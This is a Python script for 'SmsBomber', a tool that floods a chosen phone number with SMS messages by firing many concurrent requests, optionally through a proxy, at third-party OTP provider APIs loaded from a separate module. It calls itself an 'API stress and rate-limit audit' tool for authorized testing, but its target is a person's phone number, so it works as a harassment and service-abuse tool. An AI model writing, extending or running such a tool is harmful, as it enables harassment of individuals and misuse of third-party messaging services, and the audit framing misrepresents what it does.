#!/usr/bin/env python3
"""
SmsBomber - Automated API Stress & Rate-Limiting Assessment Utility
Author: Rahul Singh (cyb3rdr4g0n17)
Repository: https://github.com/cyb3rdr4g0n17/SmsBomber

FOR EDUCATIONAL, RESEARCH, AND AUTHORIZED PENETRATION AUDITING ONLY.
"""

import re
import sys
import time
import json
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor
from Provider import Provider, load_providers

# Ensure UTF-8 output on Windows consoles
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

# ANSI Color Codes
CLR_RESET = "\033[0m"
CLR_BOLD = "\033[1m"
CLR_DIM = "\033[2m"
CLR_CYAN = "\033[1;36m"
CLR_GREEN = "\033[1;32m"
CLR_YELLOW = "\033[1;33m"
CLR_RED = "\033[1;31m"
CLR_MAGENTA = "\033[1;35m"

BANNER = f"""{CLR_CYAN}
  +-------------------------------------------------------------+
  |      SmsBomber - API Resilience & Rate-Limit Audit Tool     |
  |             Author: cyb3rdr4g0n17 (Rahul Singh)             |
  +-------------------------------------------------------------+
{CLR_RESET}"""

def validate_target_number(value):
    clean = re.sub(r'[\s\-\(\)\+]', '', str(value))
    if not re.match(r'^\d{7,15}$', clean):
        raise argparse.ArgumentTypeError(
            f"'{value}' is not a valid phone number. Must contain 7 to 15 digits."
        )
    return clean

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="Automated API Rate-Limiting & Gateway Stress Testing Framework",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "target",
        metavar="TARGET",
        type=validate_target_number,
        help="Target phone number (without '+' or leading zeros, e.g. 9876543210)"
    )
    parser.add_argument(
        "--sms", "-s",
        type=int,
        default=20,
        help="Total number of requests to dispatch (default: 20)"
    )
    parser.add_argument(
        "--country", "-c",
        type=str,
        default="91",
        help="Country dialing code without '+' (default: 91)"
    )
    parser.add_argument(
        "--threads", "-t",
        type=int,
        default=10,
        help="Maximum concurrent worker threads (default: 10)"
    )
    parser.add_argument(
        "--delay", "-d",
        type=float,
        default=0.0,
        help="Delay in seconds between request dispatches (default: 0.0)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=15,
        help="HTTP request timeout in seconds (default: 15)"
    )
    parser.add_argument(
        "--proxy", "-p",
        type=str,
        default=None,
        help="HTTP/HTTPS/SOCKS proxy URL (e.g. http://127.0.0.1:8080)"
    )
    parser.add_argument(
        "--verify", "-V",
        action="store_true",
        help="Audit mode: tests all configured providers one by one to verify uptime"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Simulate execution without sending live HTTP requests"
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Enable detailed per-request logging"
    )

    return parser.parse_args()


class StressAuditController:
    def __init__(self, args):
        self.args = args
        self.lock = threading.Lock()
        self.success = 0
        self.failed = 0
        self.total = args.sms
        self.proxy_dict = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    def worker(self, provider_instance):
        if self.args.delay > 0:
            time.sleep(self.args.delay)

        try:
            provider_instance.start()
            is_ok = provider_instance.status()
            with self.lock:
                if is_ok:
                    self.success += 1
                else:
                    self.failed += 1
        except Exception as e:
            with self.lock:
                self.failed += 1
            if self.args.verbose:
                name = provider_instance.config.get("name", "Unknown")
                print(f"{CLR_RED}[ERROR]{CLR_RESET}   {name:<14} -> Exception: {e}")

        # Real-time progress ticker
        if not self.args.verbose and not self.args.verify:
            with self.lock:
                processed = self.success + self.failed
                pct = int((processed / max(1, self.total)) * 100)
                sys.stdout.write(
                    f"\r\033[K{CLR_CYAN}[AUDIT]{CLR_RESET} Progress: {processed}/{self.total} ({pct}%) | "
                    f"{CLR_GREEN}Success: {self.success}{CLR_RESET} | "
                    f"{CLR_RED}Failed: {self.failed}{CLR_RESET}"
                )
                sys.stdout.flush()

    def run(self):
        print(BANNER)

        if self.args.dry_run:
            print(f"{CLR_YELLOW}[DRY-RUN MODE ENABLED]{CLR_RESET} Network dispatches will be simulated without hitting remote APIs.\n")

        providers_catalog = load_providers()
        country_providers = providers_catalog.get(self.args.country, [])
        multi_providers = providers_catalog.get("multi", [])

        print(f"  Target Number  : {CLR_BOLD}+{self.args.country} {self.args.target}{CLR_RESET}")
        print(f"  Request Target : {CLR_BOLD}{self.total}{CLR_RESET}")
        print(f"  Worker Threads : {CLR_BOLD}{self.args.threads}{CLR_RESET}")
        print(f"  Country Code   : {CLR_BOLD}{self.args.country}{CLR_RESET} ({len(country_providers)} regional + {len(multi_providers)} multi providers available)")
        if self.args.proxy:
            print(f"  Proxy Active   : {CLR_BOLD}{self.args.proxy}{CLR_RESET}")
        print(f"{CLR_DIM}-----------------------------------------------------------------{CLR_RESET}\n")

        start_time = time.time()

        if self.args.verify:
            print(f"{CLR_YELLOW}[AUDIT MODE]{CLR_RESET} Testing all available API providers for response integrity...\n")
            all_providers = []
            for group in providers_catalog.values():
                all_providers.extend(group)

            self.total = len(all_providers)
            with ThreadPoolExecutor(max_workers=min(self.args.threads, len(all_providers))) as executor:
                for config in all_providers:
                    p = Provider(
                        target=self.args.target,
                        proxy=self.proxy_dict,
                        verbose=True,
                        cc=self.args.country,
                        timeout=self.args.timeout,
                        config=config,
                        dry_run=self.args.dry_run
                    )
                    executor.submit(self.worker, p)
        else:
            with ThreadPoolExecutor(max_workers=self.args.threads) as executor:
                for _ in range(self.total):
                    p = Provider(
                        target=self.args.target,
                        proxy=self.proxy_dict,
                        verbose=self.args.verbose,
                        cc=self.args.country,
                        timeout=self.args.timeout,
                        dry_run=self.args.dry_run
                    )
                    executor.submit(self.worker, p)

        duration = time.time() - start_time
        rate = (self.success + self.failed) / max(0.01, duration)

        print(f"\n\n{CLR_BOLD}================================================================={CLR_RESET}")
        print(f"{CLR_BOLD}                      Audit Summary                            {CLR_RESET}")
        print(f"{CLR_BOLD}================================================================={CLR_RESET}")
        print(f"  Total Dispatched : {CLR_BOLD}{self.success + self.failed}{CLR_RESET} requests")
        print(f"  Successful       : {CLR_GREEN}{self.success}{CLR_RESET}")
        print(f"  Failed / Blocked : {CLR_RED}{self.failed}{CLR_RESET}")
        print(f"  Execution Time   : {CLR_CYAN}{duration:.2f}s{CLR_RESET} ({rate:.1f} req/sec)")
        print(f"{CLR_BOLD}================================================================={CLR_RESET}\n")


def main():
    args = parse_arguments()
    controller = StressAuditController(args)
    controller.run()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{CLR_YELLOW}[ABORTED]{CLR_RESET} Audit session terminated by user.")
        sys.exit(0)
